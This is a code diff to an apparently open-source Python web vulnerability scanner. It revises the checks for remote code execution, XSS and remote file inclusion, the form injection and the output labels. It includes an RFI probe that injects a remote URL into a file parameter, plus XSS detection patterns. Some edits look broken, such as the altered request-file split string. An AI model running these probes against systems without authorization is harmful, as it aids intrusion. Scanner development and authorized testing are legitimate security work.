-            if re.search(pattern, response.text, re.IGNORECASE):
-                return True
+        # Compile regex patterns
+        rce_regex = [re.compile(pattern) for pattern in rce_patterns]
 
-    except (requests.RequestException, UnicodeDecodeError):
-        pass
+        # Check each pattern against response content
+        for regex in rce_regex:
+            if regex.search(response.text):
+                return True  # RCE pattern detected
+        return False  # No RCE pattern detected
 
-    return False
+    except Exception as e:
+        print("Error occurred during RCE check:", e)
+        return False  # Assume no RCE if an error occurs
 
 
 def check_xss(url):
@@ -1001,14 +1019,8 @@ def check_xss(url):
             r"<video[^>]*>",
             r"<audio[^>]*>",
             r"<svg[^>]*>",
-            r"&#x.{1,5};",
-            r"%[0-9a-fA-F]{2}",
-            r"&#\d+;",
-            r"expression\(",
-            r"url\(",
-            r"url\s*\(",
-            r"import\s*(",
             r"AliElTop",
+            r"13337777",
         ]
 
         for pattern in xss_patterns:
@@ -1331,12 +1343,9 @@ def check_rfi(url):
         payload = "https://raw.githubusercontent.com/dragonked2/Egyscan/main/README.md"
         rfi_response = requests.get(url + "?file=" + payload)
         if rfi_response.status_code == 200 and is_rfi_detected(rfi_response.text):
-            test_url = url + "/test"
+            test_url = url + "/"
             test_response = requests.get(test_url)
-            if (
-                test_response.status_code == 200
-                and "Test Successful" in test_response.text
-            ):
+            if test_response.status_code == 200 and "Egyscan" in test_response.text:
                 return (
                     True,
                     "Remote File Inclusion (RFI): Possible RFI vulnerability detected.",
@@ -2199,7 +2208,7 @@ def scan_for_vulnerabilities(url, payloads, headers=None, tokens=None, threads=1
                         injected_url = injected_form["action"]
                         response = make_request(
                             injected_url,
-                            data=injected_form.encode(),
+                            data=str(injected_form),
                             method=injected_form["method"],
                         )
                         if response:
@@ -2208,7 +2217,7 @@ def scan_for_vulnerabilities(url, payloads, headers=None, tokens=None, threads=1
     def scan_response(response):
         for check_func, vulnerability_type in vulnerability_checks.items():
             if check_func(response.url):
-                print(f"{vulnerability_type}{response.url}")
+                print(f"{vulnerability_type} {response.url}")
                 vulnerable_urls.add(response.url)
 
         for waf_name, waf_signatures in common_wafs.items():
@@ -2235,7 +2244,6 @@ def scan_for_vulnerabilities(url, payloads, headers=None, tokens=None, threads=1
 
     parsed_url = urlparse(url)
     base_url = parsed_url.scheme + "://" + parsed_url.netloc
-    params = parse_qs(parsed_url.query)
     vulnerable_urls = set()
     detected_wafs = []
 
@@ -2262,47 +2270,47 @@ def scan_for_vulnerabilities(url, payloads, headers=None, tokens=None, threads=1
 
 
 vulnerability_checks = {
-    check_sqli: "SQL Injection\n",
-    check_rce: "Remote Code Execution\n",
-    check_xss: "Cross-Site Scripting\n",
-    check_lfi: "Local File Inclusion\n",
-    check_open_redirect: "Open Redirect\n",
-    check_backup_files: "Backup Files\n",
-    check_database_exposure: "Database Exposure\n",
-    check_directory_listings: "Directory Listings\n",
-    check_sensitive_information: "Sensitive Information\n",
-    check_xxe: "XML External Entity Injection\n",
-    check_ssrf: "Server-Side Request Forgery\n",
-    check_rfi: "Remote File Inclusion\n",
-    check_log_files: "Log File Disclosure\n",
-    check_idor: "Insecure Direct Object Reference\n",
-    check_cors: "Cross-Origin Resource Sharing\n",
-    check_csrf: "Cross-Site Request Forgery\n",
-    check_command_injection: "Command Injection\n",
-    check_file_upload_vulnerabilities: "File Upload Vulnerabilities\n",
-    check_authentication_bypass: "Authentication Bypass\n",
-    check_insecure_configuration: "Insecure Configuration\n",
-    check_server_misconfiguration: "Server Misconfiguration\n",
-    check_injection_flaws: "Injection Flaws\n",
-    check_weak_session_management: "Weak Session Management\n",
-    check_clickjacking: "Clickjacking\n",
-    check_host_header_injection: "Host Header Injection\n",
-    check_remote_file_execution: "Remote File Execution\n",
-    check_brute_force_attacks: "Brute Force Attacks\n",
-    check_security_misconfiguration: "Security Misconfiguration\n",
-    check_missing_authentication: "Missing Authentication\n",
-    check_crlf_injection: "CRLF Injection\n",
-    check_session_fixation: "Session Fixation\n",
-    check_unvalidated_redirects: "Unvalidated Redirects\n",
-    check_command_execution: "Command Execution\n",
-    check_cross_site_tracing: "Cross-Site Tracing\n",
-    check_server_side_template_injection: "Server-Side Template Injection\n",
-    check_file_inclusion: "File Inclusion\n",
-    check_privilege_escalation: "Privilege Escalation\n",
-    check_xml_injection: "XML Injection\n",
-    check_weak_cryptography: "Weak Cryptography\n",
-    check_deserialization_vulnerabilities: "Deserialization Vulnerabilities\n",
-    check_server_side_request_forgery: "Server-Side Request Forgery\n",
+    check_sqli: "SQL Injection\n \n",
+    check_rce: "Remote Code Execution\n \n",
+    check_xss: "Cross-Site Scripting \n \n",
+    check_lfi: "Local File Inclusion\n \n",
+    check_open_redirect: "Open Redirect\n \n",
+    check_backup_files: "Backup Files\n \n",
+    check_database_exposure: "Database Exposure\n \n",
+    check_directory_listings: "Directory Listings\n \n",
+    check_sensitive_information: "Sensitive Information\n \n",
+    check_xxe: "XML External Entity Injection\n \n",
+    check_ssrf: "Server-Side Request Forgery\n \n",
+    check_rfi: "Remote File Inclusion\n \n",
+    check_log_files: "Log File Disclosure\n \n",
+    check_idor: "Insecure Direct Object Reference\n \n",
+    check_cors: "Cross-Origin Resource Sharing\n \n",
+    check_csrf: "Cross-Site Request Forgery\n \n",
+    check_command_injection: "Command Injection\n \n",
+    check_file_upload_vulnerabilities: "File Upload Vulnerabilities\n \n",
+    check_authentication_bypass: "Authentication Bypass\n \n",
+    check_insecure_configuration: "Insecure Configuration\n \n",
+    check_server_misconfiguration: "Server Misconfiguration\n \n",
+    check_injection_flaws: "Injection Flaws\n \n",
+    check_weak_session_management: "Weak Session Management\n \n",
+    check_clickjacking: "Clickjacking\n \n",
+    check_host_header_injection: "Host Header Injection\n \n",
+    check_remote_file_execution: "Remote File Execution\n \n",
+    check_brute_force_attacks: "Brute Force Attacks\n \n",
+    check_security_misconfiguration: "Security Misconfiguration\n \n",
+    check_missing_authentication: "Missing Authentication\n \n",
+    check_crlf_injection: "CRLF Injection\n \n",
+    check_session_fixation: "Session Fixation\n \n",
+    check_unvalidated_redirects: "Unvalidated Redirects\n \n",
+    check_command_execution: "Command Execution\n \n",
+    check_cross_site_tracing: "Cross-Site Tracing\n \n",
+    check_server_side_template_injection: "Server-Side Template Injection\n \n",
+    check_file_inclusion: "File Inclusion\n \n",
+    check_privilege_escalation: "Privilege Escalation\n \n",
+    check_xml_injection: "XML Injection\n \n",
+    check_weak_cryptography: "Weak Cryptography\n \n",
+    check_deserialization_vulnerabilities: "Deserialization Vulnerabilities\n \n",
+    check_server_side_request_forgery: "Server-Side Request Forgery\n \n",
 }
 
 
@@ -2383,7 +2391,7 @@ def main():
                 try:
                     with open(request_file, "r") as file:
                         request_content = file.read()
-                    headers, body = request_content.split("\n\n", 1)
+                    headers, body = request_content.split("\n\n \n", 1)
                     cookies = headers.split("Cookie: ")[1].strip()
                     headers = headers.split("\n")[1:]
                     session = create_session(cookies)
@@ -2410,7 +2418,7 @@ def main():
                 with concurrent.futures.ThreadPoolExecutor() as executor:
                     futures = [
                         executor.submit(
-                            scan_for_vulnerabilities, url, payloads, vulnerable_urls
+                            scan_for_vulnerabilities, url, PAYLOADS, vulnerable_urls
                         )
                         for url in urls
                     ]
